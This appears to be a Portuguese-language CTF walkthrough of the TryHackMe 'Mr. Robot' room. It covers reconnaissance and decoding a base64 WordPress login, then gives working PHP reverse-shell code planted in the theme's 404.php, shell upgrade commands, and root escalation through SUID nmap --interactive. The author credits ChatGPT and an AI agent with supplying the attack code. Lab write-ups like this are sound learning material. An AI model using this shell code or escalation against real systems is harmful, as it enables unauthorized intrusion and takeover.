![](./assets/images/MR.%20Robot-17.png)
---
Esta é uma série que eu ainda não assisti, mas pretendo, depois com tempo livre, com certeza irei assistir.

---

## Temos 3 flags para encontrar neste CTF

Como padrão, vamos começar o reconhecimento assim:
```python
ping TARGET
nmap -sS -T insane TARGET
nmap -sV -p22,80,443 -T insane TARGET
```

Vemos que tem uma página na web, vamos acessar.

OK, bastante coisa aleatória que não irei colocar aqui... kkkk
Mas vamos direto no "/robots.txt" que sempre tem algo a nos contar sobre o que o criador quer e o que não quer que as ferramentas de buscas exibam.

E voilà, primeira flag em menos de 30 segundos.

![](./assets/images/MR.%20Robot.png)

Vamos testar adicionar essa informação na url

![](./assets/images/MR.%20Robot-1.png)

Vamos seguir com os testes.

---

Voltando no /robots.txt, vamos analisar o outro arquivo.

![](./assets/images/MR.%20Robot.png)

E temos uma worlist gigantesca... Dei uma olhada e vi nomes como "elliot","alderson","mrrobot", por mais que não conheça a série, usei uma ferramenta poderosa para tentar encontrar valor nesta worlist...

![](./assets/images/MR.%20Robot-2.png)

KKKKKKKKKKKKKKK
Temos que usar tudo a nosso favor, amigos...

Mas ainda não sei em que usar esta bendita wordlist, provávelmente um bruteforce no SSH?
Mas ainda não explorei nada na porta 443, e sei que ela não está ali atoa...

Mas, vamos baixar essa wordlist.

![](./assets/images/MR.%20Robot-3.png)

---

Vamos fazer uma enumeração usando o Gobuster.

```python
gobuster dir -u [http://[hostname]](http://10.10.164.57) -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 100 -q -o gobuster_output.txt`
```

Saída:

![](./assets/images/MR.%20Robot-4.png)

As "license & wp-admin" são muito interessantes

Bom, nessa já partiram para a ofensa, pra que isso? kkkkk

![](./assets/images/MR.%20Robot-5.png)
 OK, mas esse site tem uma barra de rolamento gigante para uma frase... vamos testar o ``curl -l http://10.81.143.212`` e voilá novamente, algo interessante...

```python
$ curl -l http://10.81.143.212/license

## Informações totais tirando as linhas vazias

what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?

do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mgo=

```

OK, temos um hash, aparentemente base64, vamos tentar descriptografar ele.

Me chame de rato, mas não tem porque não usar, se funciona...

![](./assets/images/MR.%20Robot-6.png)

Enfim, temos um mardito user e passwd...

``user: elliot | passwd: ER28-0652 ``
Vamos tacar isso no wp-admin?

![](./assets/images/MR.%20Robot-7.png)

Vai tomando, filho...

Eu sei, fizemos do jeito fácil, provavelmente dava para ter quebrado isso com a wordlist, mas não sei se era a única possibilidade, vamos seguindo com o que dá certo primeiro.

Mas não vou mentir, eu não conheço sobre o WordPress, então precisei pesquisar como prosseguir aqui, e vi o pessoal falando sobre editar esta tela aqui, trocando as informações atuais por um comando php para reverse shell.

Agora é achar um comando que dá para fazer isso kkkkkk

---
## Reverse Shell

Vamos deixar o Netcat rodando e alterar o arquivo "404.php"

Netcat escutando:
![](./assets/images/MR.%20Robot-8.png)

Arquivo que iremos alterar:
![](./assets/images/MR.%20Robot-9.png)

Script php do ChatGPT usado para a shell reversa:
```php
<?php
$ip = '192.168.133.196';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open(
    '/bin/bash -i',
    array(
        0 => $sock,
        1 => $sock,
        2 => $sock
    ),
    $pipes
);
?>
```

Recarrega a página do arquivo:
``http://10.81.143.212/wp-includes/themes/TwentyFifteen/404.php``
![](./assets/images/MR.%20Robot-10.png)

E voilà, reverse shell:
![](./assets/images/MR.%20Robot-11.png)

Já vamos rodar o comando
``SHELL=/bin/bash script -q /dev/null``
Google vai te explicar o porque:

Aqui está o que esse comando específico faz:
>- **`SHELL=/bin/bash`**: Define a variável de ambiente para que o sistema saiba que você quer usar o Bash. PwnWiki - Shell Spawning
>- **`script`**: É um utilitário que grava sessões de terminal, mas aqui ele é usado para enganar o sistema e fazê-lo pensar que há um terminal interativo real (um PTY) anexado. Manual do comando script (die.net)
>- **`-q`**: Modo "quiet" (silencioso), para não mostrar a mensagem "Script started...".
>- **`/dev/null`**: Diz ao comando para jogar o log da sessão no lixo, já que você só quer a funcionalidade de terminal, não o registro dele.

Depois de rodar esse comando, você ainda precisa de mais dois ajustes para ficar com uma shell "de luxo":

1. Dê um `Ctrl+Z` (para colocar a shell em background).
2. Digite `stty raw -echo; fg` e dê **Enter** duas vezes.

Isso vai habilitar o **autocomplete** e permitir que você use comandos interativos como `top`, `vim` ou `sudo`.

---

Não consegui ler o arquivo da key 2-3, não vou perder tempo com isso e vou logo atrás do root.

Vamos usar o comandinho matador:
```bash
find / -perm -4000 2>/dev/null
```

Resultado:

![](./assets/images/MR.%20Robot-12.png)

A dica da flag 3 no TryHackMe, fala apenas "nmap":
![](./assets/images/MR.%20Robot-13.png)

E ali vemos nmap... Ironicamente, é a primeira vez que vejo o nmap nessa lista kkkkk
Até rodei na minha própria máquina e nada...
Então, vamos direto nele pra testar.

Nada como perguntar para uma IA que tem um bom acervo de conhecimentos, como o Agent Kali no ChatGPT:

Quando o `nmap` tem **bit SUID (-4000)**, ele **roda como root**, mesmo sendo executado por `www-data`.

Ou seja:  
👉 **qualquer funcionalidade que execute comandos = privesc direto**

Seguindo as recomendações do mesmo:
### **Modo interativo do Nmap**

Versões antigas permitem isso:

`nmap --interactive`

Dentro do prompt do nmap:

`!sh`

💥 Resultado:

`root shell`

Isso é **GTFOBins clássico**.

![](./assets/images/MR.%20Robot-14.png)

Provavelmente, um privesc mais fáceis até agora...

---
Agora com root, vamos ler as flags e zerar mais um CTF.

![](./assets/images/MR.%20Robot-15.png)

---

![](./assets/images/MR.%20Robot-16.png)

Bastante coisa nova, precisei consultar IA para o que fazer com as informações que estava conseguindo, mas vamos indo, um passo de cada vez.


